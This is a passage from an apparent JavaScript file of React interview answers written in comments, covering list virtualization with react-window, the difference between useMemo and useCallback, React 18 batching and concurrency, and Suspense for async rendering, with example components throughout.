  const items = generateGroupedItems(); // [{ type: 'header', text: 'A' }, { type: 'item', ...}]
  
  const Row = ({ index, style }) => {
    const item = items[index];
    
    if (item.type === 'header') {
      return (
        <div
          style={{
            ...style,
            position: 'sticky',
            top: 0,
            background: '#f0f0f0',
            fontWeight: 'bold',
            zIndex: 1
          }}
        >
          {item.text}
        </div>
      );
    }
    
    return <div style={style}>{item.text}</div>;
  };
  
  return (
    <FixedSizeList
      height={400}
      itemCount={items.length}
      itemSize={50}
      width="100%"
    >
      {Row}
    </FixedSizeList>
  );
}

react-virtualized (older, more features):
------------------------------------------

// react-virtualized is older but has more features
// react-window is newer, smaller, recommended

import { List } from 'react-virtualized';

function VirtualizedListOld() {
  const rowRenderer = ({ index, key, style }) => (
    <div key={key} style={style}>
      Item {index}
    </div>
  );
  
  return (
    <List
      width={300}
      height={400}
      rowCount={1000}
      rowHeight={50}
      rowRenderer={rowRenderer}
    />
  );
}

Performance Comparison:
-----------------------

Without virtualization (10,000 items):
- Initial render: 2-3 seconds
- DOM nodes: 10,000
- Memory: ~50MB
- Scroll FPS: 15-20

With virtualization (10,000 items):
- Initial render: 100ms
- DOM nodes: ~20 (only visible)
- Memory: ~5MB
- Scroll FPS: 60

Best Practices:
---------------

1. Use for large lists (>100 items)
2. Use FixedSizeList when all items same height
3. Use VariableSizeList for different heights
4. Use AutoSizer for responsive sizing
5. Add overscan for smooth scrolling
6. Memoize row components
7. Use keys properly

Complete Example:
-----------------

import { FixedSizeList } from 'react-window';
import AutoSizer from 'react-virtualized-auto-sizer';

const Row = React.memo(({ index, style, data }) => {
  const item = data[index];
  
  return (
    <div
      style={{
        ...style,
        display: 'flex',
        alignItems: 'center',
        padding: '10px',
        borderBottom: '1px solid #eee'
      }}
    >
      <img src={item.avatar} alt={item.name} />
      <div>
        <div>{item.name}</div>
        <div>{item.email}</div>
      </div>
    </div>
  );
});

function VirtualizedUserList({ users }) {
  return (
    <div style={{ height: '100vh' }}>
      <AutoSizer>
        {({ height, width }) => (
          <FixedSizeList
            height={height}
            itemCount={users.length}
            itemSize={70}
            itemData={users}
            width={width}
            overscanCount={5}  // Render 5 extra items for smooth scroll
          >
            {Row}
          </FixedSizeList>
        )}
      </AutoSizer>
    </div>
  );
}

Summary:

Virtualization:
- Render only visible items
- Dramatically improves performance
- react-window: Lightweight, modern
- react-virtualized: Feature-rich, older
- Use for lists > 100 items
- Fixed or variable sizes
- 2D grid support
- Infinite loading
- Scrolling APIs
- Essential for large datasets
*/


/**
68. What is the difference between useMemo and useCallback?
-----------------------------------------------------------

useMemo and useCallback are both React hooks for memoization, but they memoize
different things. useMemo memoizes values/results, while useCallback memoizes
functions.

Core Difference:
----------------

// useMemo: Memoizes the RESULT of a function
const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);

// useCallback: Memoizes the FUNCTION itself
const memoizedCallback = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

// They're related:
useCallback(fn, deps) === useMemo(() => fn, deps)

useMemo - Memoize Values:
--------------------------

function Component({ items, filter }) {
  // Without useMemo: filters on every render
  const filteredItems = items.filter(item => item.category === filter);
  
  // With useMemo: only filters when items or filter changes
  const filteredItems = useMemo(() => {
    console.log('Filtering...');
    return items.filter(item => item.category === filter);
  }, [items, filter]);
  
  return <List items={filteredItems} />;
}

// useMemo returns the filtered array
// Recalculates only when dependencies change

useCallback - Memoize Functions:
---------------------------------

function Component() {
  const [count, setCount] = useState(0);
  
  // Without useCallback: new function every render
  const handleClick = () => {
    console.log('Clicked');
  };
  
  // With useCallback: same function across renders
  const handleClick = useCallback(() => {
    console.log('Clicked');
  }, []); // Empty deps = function never changes
  
  return <MemoizedChild onClick={handleClick} />;
}

// useCallback returns the function itself
// Recreates function only when dependencies change

Side-by-Side Comparison:
-------------------------

// useMemo
const expensiveValue = useMemo(() => {
  return computeExpensiveValue(a, b); // Returns result
}, [a, b]);

console.log(expensiveValue); // The computed value (e.g., 42)

// useCallback
const expensiveCallback = useCallback(() => {
  return computeExpensiveValue(a, b); // Returns function
}, [a, b]);

console.log(expensiveCallback); // The function itself
console.log(expensiveCallback()); // Call it to get result (42)

When to Use Each:
-----------------

// Use useMemo for:
// 1. Expensive calculations
const sortedList = useMemo(() => {
  return [...items].sort((a, b) => a.value - b.value);
}, [items]);

// 2. Filtered/transformed data
const filteredData = useMemo(() => {
  return data.filter(item => item.active);
}, [data]);

// 3. Objects/arrays passed to memoized components
const config = useMemo(() => ({
  theme: 'dark',
  fontSize: 16
}), []); // Stable reference

<MemoizedChild config={config} />

// Use useCallback for:
// 1. Event handlers passed to memoized components
const handleClick = useCallback((id) => {
  console.log('Clicked:', id);
}, []);

<MemoizedChild onClick={handleClick} />

// 2. Functions in dependency arrays
const fetchData = useCallback(() => {
  return fetch('/api/data');
}, []);

useEffect(() => {
  fetchData(); // fetchData in deps
}, [fetchData]);

// 3. Callbacks for child components
const handleSubmit = useCallback((values) => {
  submitForm(values);
}, []);

<Form onSubmit={handleSubmit} />

Practical Examples:
-------------------

// Example 1: Search with filtering

function SearchableList({ items }) {
  const [query, setQuery] = useState('');
  
  // useMemo: Memoize filtered results
  const filteredItems = useMemo(() => {
    console.log('Filtering items...');
    return items.filter(item =>
      item.name.toLowerCase().includes(query.toLowerCase())
    );
  }, [items, query]);
  
  // useCallback: Memoize search handler
  const handleSearch = useCallback((e) => {
    setQuery(e.target.value);
  }, []); // No deps, uses event directly
  
  return (
    <div>
      <input value={query} onChange={handleSearch} />
      <List items={filteredItems} />
    </div>
  );
}

// Example 2: Todo app

function TodoApp() {
  const [todos, setTodos] = useState([]);
  const [filter, setFilter] = useState('all');
  
  // useMemo: Compute filtered todos
  const filteredTodos = useMemo(() => {
    switch (filter) {
      case 'active':
        return todos.filter(t => !t.completed);
      case 'completed':
        return todos.filter(t => t.completed);
      default:
        return todos;
    }
  }, [todos, filter]);
  
  // useMemo: Compute stats
  const stats = useMemo(() => ({
    total: todos.length,
    active: todos.filter(t => !t.completed).length,
    completed: todos.filter(t => t.completed).length
  }), [todos]);
  
  // useCallback: Memoize handlers
  const handleToggle = useCallback((id) => {
    setTodos(prev => prev.map(t =>
      t.id === id ? { ...t, completed: !t.completed } : t
    ));
  }, []);
  
  const handleDelete = useCallback((id) => {
    setTodos(prev => prev.filter(t => t.id !== id));
  }, []);
  
  const handleAdd = useCallback((text) => {
    setTodos(prev => [...prev, {
      id: Date.now(),
      text,
      completed: false
    }]);
  }, []);
  
  return (
    <div>
      <TodoStats stats={stats} />
      <TodoInput onAdd={handleAdd} />
      <TodoList
        todos={filteredTodos}
        onToggle={handleToggle}
        onDelete={handleDelete}
      />
    </div>
  );
}

// Example 3: Form with validation

function Form() {
  const [values, setValues] = useState({ name: '', email: '' });
  
  // useMemo: Compute validation errors
  const errors = useMemo(() => {
    const errs = {};
    if (!values.name) errs.name = 'Required';
    if (!values.email.includes('@')) errs.email = 'Invalid email';
    return errs;
  }, [values]);
  
  // useMemo: Check if form is valid
  const isValid = useMemo(() => {
    return Object.keys(errors).length === 0;
  }, [errors]);
  
  // useCallback: Memoize change handler
  const handleChange = useCallback((field, value) => {
    setValues(prev => ({ ...prev, [field]: value }));
  }, []);
  
  // useCallback: Memoize submit handler
  const handleSubmit = useCallback((e) => {
    e.preventDefault();
    if (isValid) {
      submitForm(values);
    }
  }, [values, isValid]);
  
  return (
    <form onSubmit={handleSubmit}>
      <Input
        value={values.name}
        onChange={(val) => handleChange('name', val)}
        error={errors.name}
      />
      <Input
        value={values.email}
        onChange={(val) => handleChange('email', val)}
        error={errors.email}
      />
      <button disabled={!isValid}>Submit</button>
    </form>
  );
}

Common Mistakes:
----------------

// Mistake 1: Using useMemo for functions

// ❌ Wrong: useMemo returns value, not function
const handleClick = useMemo(() => {
  console.log('clicked');
}, []);

// Calling it: handleClick is undefined or the return value!

// ✅ Correct: Use useCallback for functions
const handleClick = useCallback(() => {
  console.log('clicked');
}, []);

// Mistake 2: Using useCallback for values

// ❌ Wrong: useCallback returns function
const sortedList = useCallback(() => {
  return [...items].sort();
}, [items]);

// You'd have to call it: sortedList()

// ✅ Correct: Use useMemo for values
const sortedList = useMemo(() => {
  return [...items].sort();
}, [items]);

// Use directly: sortedList

// Mistake 3: Missing dependencies

// ❌ Wrong: Stale closure
const handleClick = useCallback(() => {
  console.log(count); // Always logs initial count!
}, []); // Missing count dependency

// ✅ Correct: Include dependencies
const handleClick = useCallback(() => {
  console.log(count);
}, [count]);

// ✅ Better: Use functional update (no dependency needed)
const handleClick = useCallback(() => {
  setCount(prev => {
    console.log(prev);
    return prev + 1;
  });
}, []);

Relationship:
-------------

// These are equivalent:

// useCallback
const memoizedCallback = useCallback(
  () => {
    doSomething(a, b);
  },
  [a, b]
);

// Same as useMemo returning a function
const memoizedCallback = useMemo(
  () => () => {
    doSomething(a, b);
  },
  [a, b]
);

// useCallback is just syntactic sugar for useMemo returning a function

Performance Impact:
-------------------

// Without memoization (re-renders even with same props)
function Parent() {
  const [count, setCount] = useState(0);
  
  const data = items.filter(i => i.active); // New array every render
  const handleClick = () => console.log('click'); // New function every render
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <MemoizedChild data={data} onClick={handleClick} />
      {/* Child re-renders every time! * /}
    </div>
  );
}

// With memoization (only re-renders when dependencies change)
function Parent() {
  const [count, setCount] = useState(0);
  
  const data = useMemo(() => items.filter(i => i.active), [items]);
  const handleClick = useCallback(() => console.log('click'), []);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <MemoizedChild data={data} onClick={handleClick} />
      {/* Child only re-renders if data or onClick changes * /}
    </div>
  );
}

Cheat Sheet:
------------

// Use useMemo when you want to memoize:
const value = useMemo(() => compute(), [deps]); // Computed value
const array = useMemo(() => [...items], [items]); // Array
const object = useMemo(() => ({ key: value }), [value]); // Object
const sorted = useMemo(() => items.sort(), [items]); // Sorted array
const filtered = useMemo(() => items.filter(fn), [items]); // Filtered array

// Use useCallback when you want to memoize:
const callback = useCallback(() => {}, [deps]); // Function
const handler = useCallback((e) => {}, [deps]); // Event handler
const onClick = useCallback(() => {}, [deps]); // Click handler
const onSubmit = useCallback(() => {}, [deps]); // Submit handler

Summary:

useMemo:
- Memoizes VALUES/RESULTS
- Returns computed value
- Use for expensive calculations
- Use for objects/arrays passed to children
- Syntax: useMemo(() => value, [deps])

useCallback:
- Memoizes FUNCTIONS
- Returns the function itself
- Use for event handlers
- Use for callbacks passed to children
- Syntax: useCallback(() => {}, [deps])

Both:
- Take dependency array
- Recreate when dependencies change
- Help optimize performance
- Should be used with React.memo
- Don't overuse (adds overhead)

useCallback(fn, deps) === useMemo(() => fn, deps)
*/

// Continuing with remaining questions...

/**
69. How does React batching work?
---------------------------------

React batching is an optimization where multiple state updates are grouped together
into a single re-render for better performance. Instead of re-rendering after each
setState, React batches them and re-renders once.

Before React 18:
----------------

// In event handlers - batched automatically
function Component() {
  const [count, setCount] = useState(0);
  const [flag, setFlag] = useState(false);
  
  console.log('Render');
  
  const handleClick = () => {
    setCount(c => c + 1);
    setFlag(f => !f);
    // Only 1 render (batched)
  };
  
  return <button onClick={handleClick}>Click</button>;
}

// Outside event handlers - NOT batched
function Component() {
  const [count, setCount] = useState(0);
  const [flag, setFlag] = useState(false);
  
  useEffect(() => {
    fetch('/api/data').then(() => {
      setCount(c => c + 1); // Render 1
      setFlag(f => !f);     // Render 2
      // 2 renders (not batched before React 18)
    });
  }, []);
  
  return <div>{count}</div>;
}

React 18 - Automatic Batching:
-------------------------------

// ALL updates are batched automatically in React 18

function Component() {
  const [count, setCount] = useState(0);
  const [flag, setFlag] = useState(false);
  
  console.log('Render');
  
  // Event handlers - batched
  const handleClick = () => {
    setCount(c => c + 1);
    setFlag(f => !f);
    // 1 render
  };
  
  // Timeouts - batched (new in React 18!)
  const handleTimeout = () => {
    setTimeout(() => {
      setCount(c => c + 1);
      setFlag(f => !f);
      // 1 render (batched in React 18)
    }, 1000);
  };
  
  // Promises - batched (new in React 18!)
  const handlePromise = () => {
    fetch('/api/data').then(() => {
      setCount(c => c + 1);
      setFlag(f => !f);
      // 1 render (batched in React 18)
    });
  };
  
  // Native events - batched (new in React 18!)
  useEffect(() => {
    window.addEventListener('resize', () => {
      setCount(c => c + 1);
      setFlag(f => !f);
      // 1 render (batched in React 18)
    });
  }, []);
  
  return (
    <div>
      <button onClick={handleClick}>Click</button>
      <button onClick={handleTimeout}>Timeout</button>
      <button onClick={handlePromise}>Promise</button>
    </div>
  );
}

How Batching Works:
-------------------

// Conceptual implementation

// React maintains a queue of updates
const updateQueue = [];
let isBatching = false;

function setState(newState) {
  updateQueue.push(newState);
  
  if (!isBatching) {
    isBatching = true;
    
    // Schedule flush at end of current execution
    Promise.resolve().then(() => {
      // Process all queued updates
      const updates = [...updateQueue];
      updateQueue.length = 0;
      
      // Apply all updates
      updates.forEach(applyUpdate);
      
      // Re-render once
      rerender();
      
      isBatching = false;
    });
  }
}

// Example:
setCount(1);    // Queued
setFlag(true);  // Queued
setName('Joe'); // Queued
// ... (end of synchronous execution)
// -> Single re-render with all updates

Opting Out of Batching:
------------------------

// Use flushSync to force immediate update (rare!)

import { flushSync } from 'react-dom';

function Component() {
  const [count, setCount] = useState(0);
  const [flag, setFlag] = useState(false);
  
  const handleClick = () => {
    flushSync(() => {
      setCount(c => c + 1);
      // Renders immediately
    });
    
    // Continuing execution...
    setFlag(f => !f);
    // Renders again
    
    // Total: 2 renders
  };
  
  return <button onClick={handleClick}>Click</button>;
}

// Use cases for flushSync:
// - Need to measure DOM after state change
// - Third-party libraries expecting immediate DOM updates
// - Very rare!

Example: Measuring DOM
----------------------

function Component() {
  const [height, setHeight] = useState(0);
  const divRef = useRef();
  
  const handleClick = () => {
    flushSync(() => {
      setHeight(100); // Update immediately
    });
    
    // Measure DOM after update
    console.log(divRef.current.offsetHeight); // 100
  };
  
  return (
    <div>
      <div ref={divRef} style={{ height }}>Content</div>
      <button onClick={handleClick}>Update</button>
    </div>
  );
}

Batching with Multiple Components:
-----------------------------------

// Parent and child updates are batched together

function Parent() {
  const [count, setCount] = useState(0);
  
  console.log('Parent render');
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child count={count} />
    </div>
  );
}

function Child({ count }) {
  const [localCount, setLocalCount] = useState(0);
  
  console.log('Child render');
  
  useEffect(() => {
    // Both updates batched
    setLocalCount(count * 2);
  }, [count]);
  
  return <div>Local: {localCount}</div>;
}

// Click button:
// -> setCount in Parent
// -> setLocalCount in Child effect
// -> Single render cycle for both

Batching and Event Bubbling:
-----------------------------

function Component() {
  const [count, setCount] = useState(0);
  
  return (
    <div onClick={() => {
      console.log('Div clicked');
      setCount(c => c + 1);
    }}>
      <button onClick={() => {
        console.log('Button clicked');
        setCount(c => c + 1);
      }}>
        Click
      </button>
    </div>
  );
}

// Click button:
// 1. Button onClick fires: setCount
// 2. Event bubbles to div
// 3. Div onClick fires: setCount
// 4. Both updates batched -> 1 render

// Logs:
// Button clicked
// Div clicked
// Render (once)

Comparison: Before vs After React 18
-------------------------------------

// React 17
function OldBehavior() {
  const [count, setCount] = useState(0);
  
  // Event handler: batched
  const handleClick = () => {
    setCount(1); // Batched
    setCount(2); // Batched
    // 1 render
  };
  
  // Timeout: NOT batched
  const handleTimeout = () => {
    setTimeout(() => {
      setCount(1); // Render 1
      setCount(2); // Render 2
      // 2 renders!
    });
  };
  
  // Promise: NOT batched
  const handlePromise = () => {
    Promise.resolve().then(() => {
      setCount(1); // Render 1
      setCount(2); // Render 2
      // 2 renders!
    });
  };
}

// React 18
function NewBehavior() {
  const [count, setCount] = useState(0);
  
  // Event handler: batched
  const handleClick = () => {
    setCount(1); // Batched
    setCount(2); // Batched
    // 1 render
  };
  
  // Timeout: NOW batched!
  const handleTimeout = () => {
    setTimeout(() => {
      setCount(1); // Batched
      setCount(2); // Batched
      // 1 render
    });
  };
  
  // Promise: NOW batched!
  const handlePromise = () => {
    Promise.resolve().then(() => {
      setCount(1); // Batched
      setCount(2); // Batched
      // 1 render
    });
  };
}

Benefits of Batching:
---------------------

1. Better performance
   - Fewer renders
   - Fewer DOM updates
   - Better FPS

2. Consistency
   - State updates applied together
   - Prevents "tearing" (partial updates visible)

3. Simpler mental model
   - Predictable behavior
   - Works everywhere (React 18)

Testing Batching:
-----------------

function BatchingDemo() {
  const [count1, setCount1] = useState(0);
  const [count2, setCount2] = useState(0);
  const [count3, setCount3] = useState(0);
  
  console.log('Render:', count1, count2, count3);
  
  const handleBatchedUpdate = () => {
    console.log('Starting updates...');
    setCount1(c => c + 1);
    setCount2(c => c + 1);
    setCount3(c => c + 1);
    console.log('Updates queued');
  };
  
  return (
    <div>
      <button onClick={handleBatchedUpdate}>
        Batched Update
      </button>
      <p>Count1: {count1}</p>
      <p>Count2: {count2}</p>
      <p>Count3: {count3}</p>
    </div>
  );
}

// Click button:
// Starting updates...
// Updates queued
// Render: 1 1 1 (single render)

Summary:

React Batching:
- Groups multiple state updates into single re-render
- React 17: Only in event handlers
- React 18: Everywhere (automatic batching)
- Improves performance
- Use flushSync to opt out (rare)
- Transparent optimization
- Works across components
- No code changes needed (React 18)
*/


/**
70. What is concurrency in React 18?
------------------------------------

Concurrency in React 18 is the ability for React to work on multiple tasks at once,
pausing and resuming work as needed. It allows React to prepare multiple versions
of the UI simultaneously and prioritize updates based on urgency.

Key Concept:
- React can interrupt rendering to handle higher-priority updates
- Keeps UI responsive during expensive operations
- Not about parallel threads (JavaScript is single-threaded)
- About interruptible rendering

Before Concurrency (Blocking Rendering):
-----------------------------------------

// React 17: Rendering blocks main thread
function App() {
  const [query, setQuery] = useState('');
  const [items, setItems] = useState([]);
  
  const handleChange = (e) => {
    setQuery(e.target.value);
    
    // Expensive filtering blocks UI
    const filtered = expensiveFilter(e.target.value, largeDataset);
    setItems(filtered);
    // UI freezes during filtering!
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      <List items={items} />
    </div>
  );
}

// User types "hello":
// h - Update starts, UI freezes
// e - Queued (can't process yet)
// l - Queued
// l - Queued  
// o - Queued
// Finally all process at once -> janky experience

With Concurrency (Interruptible Rendering):
--------------------------------------------

import { startTransition } from 'react';

function App() {
  const [query, setQuery] = useState('');
  const [items, setItems] = useState([]);
  
  const handleChange = (e) => {
    // Urgent: Update input immediately
    setQuery(e.target.value);
    
    // Non-urgent: Mark as transition
    startTransition(() => {
      const filtered = expensiveFilter(e.target.value, largeDataset);
      setItems(filtered);
    });
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      <List items={items} />
    </div>
  );
}

// User types "hello":
// h - Input updates immediately, filtering starts
// e - Input updates, previous filtering paused, new filtering starts
// l - Input updates, previous filtering paused, new filtering starts
// (etc.)
// Smooth typing experience!

useTransition Hook:
-------------------

import { useTransition } from 'react';

function SearchPage() {
  const [query, setQuery] = useState('');
  const [items, setItems] = useState([]);
  const [isPending, startTransition] = useTransition();
  
  const handleChange = (e) => {
    setQuery(e.target.value);
    
    startTransition(() => {
      // This update is marked as non-urgent
      const filtered = expensiveFilter(e.target.value, largeData);
      setItems(filtered);
    });
  };
  
  return (
    <div>
      <input value={query} onChange={handleChange} />
      
      {/* Show loading state during transition * /}
      {isPending && <Spinner />}
      
      {/* Show results (may be stale during transition) * /}
      <List items={items} />
    </div>
  );
}

useDeferredValue Hook:
-----------------------

import { useDeferredValue } from 'react';

function SearchPage() {
  const [query, setQuery] = useState('');
  
  // Defer expensive computation
  const deferredQuery = useDeferredValue(query);
  
  // Items computed with deferred value
  const items = useMemo(() => {
    return expensiveFilter(deferredQuery, largeData);
  }, [deferredQuery]);
  
  return (
    <div>
      {/* Input always responsive * /}
      <input value={query} onChange={e => setQuery(e.target.value)} />
      
      {/* Results may lag behind input * /}
      <List items={items} />
    </div>
  );
}

// query updates immediately (urgent)
// deferredQuery updates later (non-urgent)

useTransition vs useDeferredValue:
-----------------------------------

// useTransition: You control when to start transition
function Component() {
  const [isPending, startTransition] = useTransition();
  
  const handleClick = () => {
    startTransition(() => {
      // Explicitly mark this as non-urgent
      updateState();
    });
  };
  
  return <button onClick={handleClick}>Update</button>;
}

// useDeferredValue: React defers the value automatically
function Component() {
  const [value, setValue] = useState('');
  const deferredValue = useDeferredValue(value);
  
  // value updates urgently
  // deferredValue updates non-urgently
  
  return <ExpensiveTree value={deferredValue} />;
}

Priority Levels:
----------------

// React now has multiple priority levels:

// 1. Urgent updates (high priority)
// - User input (typing, clicking)
// - Immediate feedback
// - Must not be interrupted

// 2. Transition updates (low priority)
// - Expensive renders
// - Data fetching results
// - Can be interrupted

// Example:
function TabContainer() {
  const [activeTab, setActiveTab] = useState('home');
  const [isPending, startTransition] = useTransition();
  
  const switchTab = (tab) => {
    // Urgent: Update tab immediately
    setActiveTab(tab);
    
    // Non-urgent: Render tab content
    startTransition(() => {
      renderTabContent(tab);
    });
  };
  
  return (
    <div>
      <Tabs active={activeTab} onChange={switchTab} />
      {isPending && <LoadingBar />}
      <TabContent tab={activeTab} />
    </div>
  );
}

Real-World Example: Tab Switching
----------------------------------

function SlowTab() {
  // Simulate slow component
  const items = [];
  for (let i = 0; i < 1000; i++) {
    items.push(<SlowItem key={i} />);
  }
  return <div>{items}</div>;
}

// Without transitions: UI freezes when switching tabs
function AppWithoutTransition() {
  const [activeTab, setActiveTab] = useState('home');
  
  return (
    <div>
      <button onClick={() => setActiveTab('home')}>Home</button>
      <button onClick={() => setActiveTab('profile')}>Profile</button>
      <button onClick={() => setActiveTab('settings')}>Settings</button>
      
      {activeTab === 'home' && <div>Home</div>}
      {activeTab === 'profile' && <SlowTab />}
      {activeTab === 'settings' && <div>Settings</div>}
    </div>
  );
}

// With transitions: UI stays responsive
function AppWithTransition() {
  const [activeTab, setActiveTab] = useState('home');
  const [isPending, startTransition] = useTransition();
  
  const selectTab = (tab) => {
    startTransition(() => {
      setActiveTab(tab);
    });
  };
  
  return (
    <div>
      <button onClick={() => selectTab('home')}>Home</button>
      <button onClick={() => selectTab('profile')}>Profile</button>
      <button onClick={() => selectTab('settings')}>Settings</button>
      
      {isPending && <Spinner />}
      
      <div style={{ opacity: isPending ? 0.5 : 1 }}>
        {activeTab === 'home' && <div>Home</div>}
        {activeTab === 'profile' && <SlowTab />}
        {activeTab === 'settings' && <div>Settings</div>}
      </div>
    </div>
  );
}

Concurrent Features in React 18:
---------------------------------

// 1. Automatic Batching (covered earlier)

// 2. Transitions (startTransition, useTransition)

// 3. Suspense for data fetching

// 4. useDeferredValue

// 5. Concurrent rendering (automatic with React 18)

How Concurrency Works Internally:
----------------------------------

// Fiber architecture enables concurrency

// Without concurrency:
// Start render -> Render all components -> Commit -> Done
// (Blocks main thread, can't be interrupted)

// With concurrency:
// Start render
// -> Render Component 1
// -> High-priority update arrives!
// -> Pause current work
// -> Handle high-priority update
// -> Resume previous work
// -> Finish render -> Commit

// React uses time slicing: breaks work into chunks

Best Practices:
---------------

// 1. Use transitions for expensive updates
function SearchResults() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  const [isPending, startTransition] = useTransition();
  
  const search = (q) => {
    setQuery(q); // Urgent: show what user typed
    
    startTransition(() => {
      // Non-urgent: update results
      const filtered = expensiveSearch(q);
      setResults(filtered);
    });
  };
  
  return (
    <div>
      <input value={query} onChange={e => search(e.target.value)} />
      {isPending ? <Skeleton /> : <Results data={results} />}
    </div>
  );
}

// 2. Show loading states during transitions
{isPending && <LoadingIndicator />}
<div style={{ opacity: isPending ? 0.6 : 1 }}>
  {/* Content * /}
</div>

// 3. Use useDeferredValue for derived state
const deferredValue = useDeferredValue(expensiveValue);

// 4. Keep urgent updates separate from transitions
const handleChange = (e) => {
  setValue(e.target.value); // Urgent
  startTransition(() => {
    updateResults(e.target.value); // Non-urgent
  });
};

Enabling Concurrent Features:
------------------------------

// React 18: Use createRoot (not render)
import { createRoot } from 'react-dom/client';

const root = createRoot(document.getElementById('root'));
root.render(<App />);

// This enables concurrent features!

// Old way (React 17):
import ReactDOM from 'react-dom';
ReactDOM.render(<App />, document.getElementById('root'));

Summary:

Concurrency in React 18:
- Interruptible rendering
- Prioritizes urgent updates
- Keeps UI responsive
- useTransition for non-urgent updates
- useDeferredValue for derived values
- isPending for loading states
- Automatic batching everywhere
- Requires createRoot
- Backward compatible
- Opt-in for new features
- Major performance improvement for complex UIs
*/




/**
71. What is Suspense and how does it help with async rendering?
---------------------------------------------------------------

Suspense is a React component that lets you "wait" for some code or data to load,
displaying a fallback UI (like a loading spinner) while waiting. It helps handle
async operations declaratively by suspending component rendering until data is ready.

Basic Concept:
--------------

// Instead of this (traditional approach):
function Component() {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    fetchData()
      .then(data => {
        setData(data);
        setLoading(false);
      })
      .catch(err => {
        setError(err);
        setLoading(false);
      });
  }, []);
  
  if (loading) return <Spinner />;
  if (error) return <Error />;
  return <div>{data}</div>;
}

// Use Suspense (declarative approach):
function Component() {
  const data = useDataResource(); // Suspends while loading
  return <div>{data}</div>;
}

// Wrap with Suspense boundary
<Suspense fallback={<Spinner />}>
  <Component />
</Suspense>

Basic Usage:
------------

import { Suspense } from 'react';

function App() {
  return (
    <div>
      <h1>My App</h1>
      
      <Suspense fallback={<div>Loading...</div>}>
        <AsyncComponent />
      </Suspense>
    </div>
  );
}

// AsyncComponent "suspends" (throws promise) while loading
// Suspense catches it and shows fallback
// When promise resolves, AsyncComponent renders

Code Splitting with Suspense:
------------------------------

import { lazy, Suspense } from 'react';

// Lazy load component
const HeavyComponent = lazy(() => import('./HeavyComponent'));
const Dashboard = lazy(() => import('./Dashboard'));
const Profile = lazy(() => import('./Profile'));

function App() {
  return (
    <div>
      <Suspense fallback={<div>Loading component...</div>}>
        <HeavyComponent />
      </Suspense>
      
      <Suspense fallback={<PageSkeleton />}>
        <Dashboard />
      </Suspense>
    </div>
  );
}

// Benefits:
// - Smaller initial bundle
// - Faster initial load
// - Load components only when needed

Multiple Components in One Boundary:
------------------------------------

// All components under one Suspense boundary load together

<Suspense fallback={<LoadingScreen />}>
  <ProfilePage />
  <Comments />
  <RecommendedPosts />
</Suspense>

// If ANY child suspends, shows LoadingScreen
// When ALL are ready, shows everything together (no waterfall)
// Avoids partial loading states

Nested Suspense Boundaries:
----------------------------

// Different loading states for different parts of the UI

<Suspense fallback={<PageSkeleton />}>
  <Header />
  
  <Suspense fallback={<PostsSkeleton />}>
    <Posts />
  </Suspense>
  
  <Suspense fallback={<SidebarSkeleton />}>
    <Sidebar />
  </Suspense>
  
  <Footer />
</Suspense>

// Granular loading:
// - Header suspends -> shows PageSkeleton for whole page
// - Posts suspends -> shows PostsSkeleton (sidebar/footer still visible)
// - Sidebar suspends -> shows SidebarSkeleton (posts/footer still visible)

How Suspense Works (Internally):
---------------------------------

// Suspense-compatible resource throws a promise while loading

function createResource(promise) {
  let status = 'pending';
  let result;
  
  let suspender = promise.then(
    (data) => {
      status = 'success';
      result = data;
    },
    (error) => {
      status = 'error';
      result = error;
    }
  );
  
  return {
    read() {
      if (status === 'pending') {
        throw suspender; // Suspense catches this!
      }
      if (status === 'error') {
        throw result;
      }
      return result;
    }
  };
}

// Component using the resource
function Component() {
  const data = resource.read(); // Throws promise if pending
  return <div>{data}</div>;
}

// Suspense catches thrown promise
<Suspense fallback={<Loading />}>
  <Component />
</Suspense>

Data Fetching with Suspense:
-----------------------------

// Example: TV show search app

// fetchData utility (Suspense-compatible)
export const fetchData = (apiURL) => {
  let status = 'pending';
  let result;
  
  let suspender = fetch(apiURL)
    .then(response => response.json())
    .then(data => {
      status = 'success';
      result = data;
    })
    .catch(error => {
      status = 'error';
      result = error;
    });
  
  return {
    read() {
      if (status === 'pending') {
        throw suspender; // Suspend!
      }
      if (status === 'error') {
        throw result;
      }
      return result;
    }
  };
};

// Create resource outside component
const showsResource = fetchData('https://api.tvmaze.com/search/shows?q=heist');

// Component using the resource
function Shows() {
  const shows = showsResource.read(); // Suspends if pending
  
  return (
    <div>
      {shows.map(show => (
        <div key={show.show.id}>
          <h2>{show.show.name}</h2>
          <img src={show.show.image?.medium} alt={show.show.name} />
        </div>
      ))}
    </div>
  );
}

// App with Suspense
function App() {
  return (
    <div className="App">
      <h1>React Suspense Demo</h1>
      
      <Suspense fallback={<p>Loading shows...</p>}>
        <Shows />
      </Suspense>
    </div>
  );
}

Revealing Content All at Once:
-------------------------------

// Fetch show details and episodes separately
// Show both only when BOTH are ready

const showDetailsResource = fetchData('https://api.tvmaze.com/shows/1234');
const episodesResource = fetchData('https://api.tvmaze.com/shows/1234/episodes');

function ShowDetails() {
  const show = showDetailsResource.read();
  
  return (
    <div>
      <h2>{show.name}</h2>
      <img src={show.image?.medium} alt={show.name} />
      <p>{show.summary}</p>
    </div>
  );
}

function ShowEpisodes() {
  const episodes = episodesResource.read();
  
  return (
    <div>
      <h3>Episodes</h3>
      <ul>
        {episodes.map(ep => (
          <li key={ep.id}>
            S{ep.season}E{ep.number}: {ep.name}
          </li>
        ))}
      </ul>
    </div>
  );
}

// Both components under one Suspense boundary
function App() {
  return (
    <div>
      <h1>Show Details</h1>
      
      <Suspense fallback={<p>Loading show data...</p>}>
        <ShowDetails />
        <ShowEpisodes />
      </Suspense>
    </div>
  );
}

// Shows fallback until BOTH details and episodes are loaded
// Then reveals both together (no partial loading)

Progressive Reveal with Nested Suspense:
-----------------------------------------

// Show details immediately, load episodes after

function ShowDetails() {
  const show = showDetailsResource.read();
  
  return (
    <div>
      <h2>{show.name}</h2>
      <img src={show.image?.medium} alt={show.name} />
      <p>{show.summary}</p>
